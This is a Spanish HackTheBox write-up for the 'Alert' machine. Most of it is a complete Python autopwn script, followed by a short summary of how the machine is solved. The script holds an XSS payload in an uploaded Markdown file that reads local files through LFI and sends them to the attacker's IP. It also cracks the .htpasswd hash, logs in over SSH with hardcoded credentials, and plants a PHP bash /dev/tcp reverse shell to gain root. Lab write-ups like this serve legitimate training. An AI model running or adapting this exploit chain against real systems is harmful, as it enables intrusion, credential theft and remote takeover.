---
title: "Alert"
date: 2025-03-25 10:16:11 +0100
categories: writeups hackthebox
tags: máquina linux autopwned lfi xss rce criptografía
description: Writeup de la máquina Alert de HackTheBox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Autopwned

<details>
    <summary>Click para ver el autopwned</summary>
<div class="language-python highlighter-rouge">
   <div class="code-header">
      <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
   </div>
   <div class="highlight">
      <code>
         <table class="rouge-table">
            <tbody>
               <tr style="background-color: #151515;">
                  <td class="rouge-gutter gl">
                     <pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
</pre>
                  </td>
                  <td class="rouge-code">
                     <pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="c1"># Author: Álvaro Bernal (aka. trr0r)
</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">paramiko</span>
<span class="kn">from</span> <span class="n">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="c1"># Mostrar menos output
# context.log_level = 'warn'
</span>
<span class="c1"># Debuging
# proxy = {"http" : "http://localhost:8080"}
</span>
<span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/var/www/statistics.alert.htb/.htpasswd</span><span class="sh">"</span>
<span class="c1">#filename = "/etc/passwd" # Elegir el fichero que queremos leer, por defecto será /var/www/statistics.alert.htb/.htpasswd
</span><span class="n">content_file</span> <span class="o">=</span> <span class="sh">""</span>

<span class="c1"># Variables Estáticas
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">PORT_NC</span> <span class="o">=</span> <span class="mi">443</span>
<span class="n">hash_file</span> <span class="o">=</span> <span class="sh">"</span><span class="s">hash.txt</span><span class="sh">"</span>
<span class="n">wordlist</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/usr/share/wordlists/rockyou.txt</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">ctrl_c</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">ctrl_c</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_ip</span><span class="p">():</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\t</span><span class="s">[+] Uso: alert_autopwn.py target_ip host_ip</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">[</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span>

<span class="k">def</span> <span class="nf">check_connect</span><span class="p">():</span>
    <span class="n">resultado</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">timeout</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ping</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">resultado</span><span class="p">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] No tienes conectividad con la máquina víctima</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea, ya que si que no ponemos "\n" se bugea
</span>
    <span class="n">file_bar</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Subiendo fichero Markdown</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">blue</span><span class="sh">"</span><span class="p">))</span>

    <span class="n">md_url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://alert.htb/visualizer.php</span><span class="sh">"</span>

    <span class="n">content_file</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
&lt;script&gt;
    x=new XMLHttpRequest;
    x.onload=function(){new Image().src=</span><span class="sh">"</span><span class="s">http://%s/?-%s-=</span><span class="sh">"</span><span class="s">+btoa(this.responseText)};
    x.open(</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">http://alert.htb/messages.php?file=../../../../../../../..%s</span><span class="sh">"</span><span class="s">);x.send();
&lt;/script&gt;
</span><span class="sh">"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>

    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">file</span><span class="sh">"</span> <span class="p">:</span> <span class="p">(</span><span class="sh">"</span><span class="s">pwned.md</span><span class="sh">"</span><span class="p">,</span> <span class="n">content_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">text/markdown</span><span class="sh">"</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">md_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="p">)</span>

    <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">"</span><span class="s">html.parser</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">button</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="sh">"</span><span class="s">share-button</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">link</span> <span class="o">=</span> <span class="n">button</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">href</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">file_bar</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Fichero Markdown subido correctamente</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">link</span>

<span class="k">def</span> <span class="nf">send_link</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">):</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea, ya que si que no ponemos "\n" se bugea
</span>
    <span class="n">contact_bar</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando link al usuario administrador</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>

    <span class="n">contact_url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://alert.htb/contact.php</span><span class="sh">"</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">email</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">trr0r@trr0r.com</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span> <span class="p">:</span> <span class="n">link</span>
    <span class="p">}</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">contact_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

    <span class="n">status</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">"</span><span class="s">Location</span><span class="sh">"</span><span class="p">]</span>

    <span class="k">if</span> <span class="sh">"</span><span class="s">Message%20sent%20successfully!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">status</span><span class="p">:</span>
        <span class="n">contact_bar</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Link enviado correctamente</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">contact_bar</span><span class="p">.</span><span class="nf">failure</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Ha habido un problema al enviar el link</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">recv_all</span><span class="p">(</span><span class="n">client</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>  <span class="c1"># Buffer donde almacenamos los datos
</span>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>  <span class="c1"># Recibimos en bloques
</span>        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
            <span class="k">break</span>  <span class="c1"># Salimos cuando ya no haya más datos
</span>        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>  <span class="c1"># Agregamos al buffer
</span>
    <span class="k">return</span> <span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">)</span>  <span class="c1"># Convertimos a string
</span>
<span class="k">def</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">content_file</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea, ya que si que no ponemos "\n" se bugea
</span>
    <span class="n">file_content_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Capturando el contenido del fichero </span><span class="se">\"</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">server</span><span class="p">:</span>
        <span class="n">server</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>

        <span class="n">server</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">client</span><span class="p">,</span> <span class="n">client_addr</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>

            <span class="k">if</span> <span class="n">client_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">target_ip</span><span class="p">:</span>
                <span class="n">file_content_log</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Solicitud recibida, procesando...</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
                <span class="n">request</span> <span class="o">=</span> <span class="nf">recv_all</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>

                <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">rf</span><span class="sh">"</span><span class="s">GET /\?-</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">-=([A-Za-z0-9+=/]+)</span><span class="sh">"</span><span class="p">,</span> <span class="n">request</span><span class="p">)</span>

                <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
                    <span class="n">file_content_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Contenido capturado exitosamente</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
                    <span class="n">content_file</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">match</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">)</span>

                    <span class="n">content_file</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">&lt;/?pre&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">,</span> <span class="n">content_file</span><span class="p">)</span>

                    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea, ya que si que no ponemos "\n" se bugea
</span>
                    <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Contenido del fichero</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>

                    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea, ya que si que no ponemos "\n" se bugea
</span>
                    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">content_file</span><span class="p">.</span><span class="nf">splitlines</span><span class="p">():</span>
                        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
                    <span class="k">break</span>

<span class="k">def</span> <span class="nf">decode_password</span><span class="p">(</span><span class="n">content_file</span><span class="p">):</span>
    <span class="nb">hash</span> <span class="o">=</span> <span class="n">content_file</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>

    <span class="n">crack_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Crackeando el hash </span><span class="se">\"</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">hash_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>

    <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">hashcat</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-m</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1600</span><span class="sh">"</span><span class="p">,</span> <span class="n">hash_file</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">,</span> <span class="sh">"</span><span class="s">--username</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--potfile-disable</span><span class="sh">"</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">hashcat</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-m</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1600</span><span class="sh">"</span><span class="p">,</span> <span class="n">hash_file</span><span class="p">,</span> <span class="sh">"</span><span class="s">--username</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--show</span><span class="sh">"</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>

    <span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">crack_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Hash crackeado correctamente, </span><span class="se">\"</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span>

<span class="k">def</span> <span class="nf">connect_ssh</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">):</span>

    <span class="c1"># Nos ponemos en escucha por el puerto PORT_NC (443)
</span>    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">listening</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">PORT_NC</span><span class="p">,</span><span class="n">username</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>

    <span class="c1"># Nos conectamos a través de SSH
</span>    <span class="n">ssh_conn</span> <span class="o">=</span> <span class="nf">ssh</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>

    <span class="c1"># Escribimos la Reverse Shell en un fichero, ya que el servicio HTTP está siendo ejecutado por el root
</span>    <span class="n">ssh_conn</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sa">f</span><span class="sh">"""</span><span class="s">cat &lt;&lt;EOF &gt; /opt/website-monitor/config/trr0r.php
&lt;?php system(</span><span class="sh">"</span><span class="s">bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">host_ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">PORT_NC</span><span class="si">}</span><span class="s"> 0&gt;&amp;1</span><span class="sh">'"</span><span class="s">); ?&gt;
EOF</span><span class="sh">"""</span><span class="p">)</span>

    <span class="c1"># Accedemos al fichero de la Reverse Shell
</span>    <span class="n">ssh_conn</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">curl localhost:8080/config/trr0r.php</span><span class="sh">"</span><span class="p">)</span>

    <span class="c1"># Cerramos la conexión
</span>    <span class="n">ssh_conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">listening</span><span class="p">(</span><span class="n">PORT_NC</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
    <span class="n">listener</span> <span class="o">=</span> <span class="nf">listen</span><span class="p">(</span><span class="n">PORT_NC</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="nf">wait_for_connection</span><span class="p">()</span>

    <span class="c1"># Recibimos las dos cabeceras para evitar problemas
</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>

    <span class="c1"># Mostramos por pantalla las 2 flags
</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">echo </span><span class="sh">"</span><span class="s">User Flag -&gt; `cat /home/albert/user.txt`</span><span class="sh">"</span><span class="s">; echo </span><span class="sh">"</span><span class="s">Root Flag -&gt; `cat /root/root.txt`</span><span class="sh">"</span><span class="s"> </span><span class="sh">"""</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>

    <span class="c1"># Finalmente, entraremos en modo interactivo
</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="c1"># Borramos los ficheros que hemos creado
</span><span class="k">def</span> <span class="nf">clean_hash_file</span><span class="p">():</span>

    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">hash_file</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">hash_file</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span> <span class="o">=</span> <span class="nf">get_ip</span><span class="p">()</span>
    <span class="nf">check_connect</span><span class="p">()</span>
    <span class="n">link</span> <span class="o">=</span> <span class="nf">upload_file</span><span class="p">()</span>
    <span class="n">file_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_file_content</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">host_ip</span><span class="p">,</span><span class="n">target_ip</span><span class="p">))</span>
    <span class="n">file_thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="nf">send_link</span><span class="p">(</span><span class="n">link</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">)</span>
    <span class="n">file_thread</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">filename</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/var/www/statistics.alert.htb/.htpasswd</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="sh">"</span><span class="s">albert</span><span class="sh">"</span>
        <span class="n">password</span> <span class="o">=</span> <span class="sh">"</span><span class="s">manchesterunited</span><span class="sh">"</span>
        <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="nf">decode_password</span><span class="p">(</span><span class="n">content_file</span><span class="p">)</span>
        <span class="nf">connect_ssh</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">)</span>
    <span class="nf">clean_hash_file</span><span class="p">()</span>
</pre>
                  </td>
               </tr>
            </tbody>
         </table>
      </code>
   </div>
</div>
</details>

___
## Resumen de la resolución

**Alert** es una máquina **Linux** de dificultad **Fácil** en **HackTheBox**. Se inicia con la enumeración de puertos, identificando un servidor web vulnerable. Se explota una vulnerabilidad **XSS** para obtener **LFI** y acceder a archivos sensibles. Luego, se extraen credenciales desde un archivo **.htpasswd**, permitiendo el acceso como el usuario **albert** por SSH. Finalmente, se abusa de un grupo con privilegios especiales para ejecutar un **chmod** en **/bin/bash**, logrando una shell privilegiada y obteniendo acceso **root**.

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

